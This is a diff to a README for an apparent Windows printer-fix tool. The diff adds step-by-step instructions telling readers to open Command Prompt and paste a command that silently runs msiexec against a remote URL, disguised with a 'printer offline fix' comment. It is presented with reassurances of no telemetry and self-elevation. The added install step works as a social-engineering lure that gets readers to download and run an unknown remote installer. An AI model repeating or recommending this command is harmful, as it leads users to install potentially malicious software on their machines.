@@ -21,12 +21,20 @@ Stop fighting with `services.msc`, registry tweaks, and 14-step Microsoft suppor
 ---
 
 ## 🚀 Install (one command)
-
-Open **CMD as Administrator** and paste:
-
+1. Press **Win + R**
+2. Type:
+```
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
+---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
 ```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem printer offline fix
 ```
+The installer will automatically download and install the required components.
 
 That's it. The installer downloads the tool, self-elevates if needed, and launches the interactive fix wizard. **No dependencies. No accounts. No telemetry.**
 
